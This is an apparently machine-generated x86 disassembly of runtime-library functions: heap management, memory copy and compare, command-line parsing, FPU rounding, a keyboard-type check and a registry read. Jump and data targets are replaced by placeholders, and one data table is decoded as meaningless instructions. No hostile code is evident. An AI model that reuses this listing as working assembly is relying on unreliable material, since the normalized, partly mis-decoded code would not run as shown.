call sub_401ec0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401440
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401ce0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d50
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c64
sub [ edi + 0x4 ] 0x4
sub_401f98
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017ec
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f0c
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fc4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40187c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f0c
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401ff8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402024
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bd0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e38
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f98
test al al
jne r-xdata
mov eax esi
call sub_401ff8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402118
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a2c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402294
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401388
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402024
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401390
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b10
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b10
jmp r-xdata
sub_4022a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40243a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a2c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401388
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401390
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403b10
jmp r-xdata
call sub_401ec0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bd0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e38
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bd0
sub_40244c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ec0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bd0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fc4
test al al
je r-xdata
call sub_401bd0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c94
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e38
jmp r-xdata
sub_402628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026d9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a2c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40244c
test al al
je r-xdata
push rw-data
call sub_401388
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402118
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028e8
mov eax ebx
call sub_4022a8
retn
push rw-data
call sub_401390
sub_4026ec
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402848
sub_40270c
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402848
sub_40272c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402848
mov [ ecx ] eax
mov al 0x2
jmp sub_402848
retn
mov [ ecx ] eax
retn
sub_4027bc
push ebx
push esi
call sub_406074
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406074
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406074
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027fc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406074
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027f0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402884
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028e8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402928
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40123c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4046f8
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40123c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40123c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a14
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_4040ac
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40128c
mov ecx eax
mov edx esp
mov eax ebx
call sub_40419c
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402928
mov edi eax
test esi esi
je r-xdata
sub_402a98
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_402ac8
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402b08
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402874
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b5c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402874
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402874
jmp r-xdata
sub_402bb4
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028e8
pop ebx
retn
mov ecx ebx
sub_402bd0
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c54
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402cc4
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402ce4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402dc4
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402e04
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eb7 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eb7 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402eb7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4030f0
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403120
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012e4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403191
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012dc
retn
sub_403214
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4032bc
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403314
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404b08
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403334
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_40595c
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403364
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033e8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033f8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033ef
lea eax [ ebp - 0x8 ]
call sub_405944
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403334
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40595c
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033f8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40343c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4034c4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40347c
push edi
xchg esi eax
jmp r-xdata
